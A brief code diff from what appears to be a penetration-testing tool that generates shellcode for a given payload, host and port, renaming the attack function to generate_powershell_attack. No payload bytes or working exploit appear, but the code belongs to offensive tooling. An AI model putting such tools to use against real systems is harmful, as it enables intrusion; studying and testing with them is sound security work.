@@ -69,7 +69,7 @@ def generate_shellcode(payload, host, port):
     return shellcode_filter(shellcode)
 
 
-def generate_shellcode_attack(payload, host, port):
+def generate_powershell_attack(payload, host, port):
     """generate shellcode: 0x00,0x00,0x00,..."""
     shellcode = generate_shellcode(payload, host, port)
     shellcode = re.sub("\\\\x", "0x", shellcode)
@@ -176,4 +176,4 @@ if __name__ == "__main__":
         payload = sys.argv[1]
         host = sys.argv[2]
         port = sys.argv[3]
-        generate_shellcode_attack(payload, host, port)
+        generate_powershell_attack(payload, host, port)
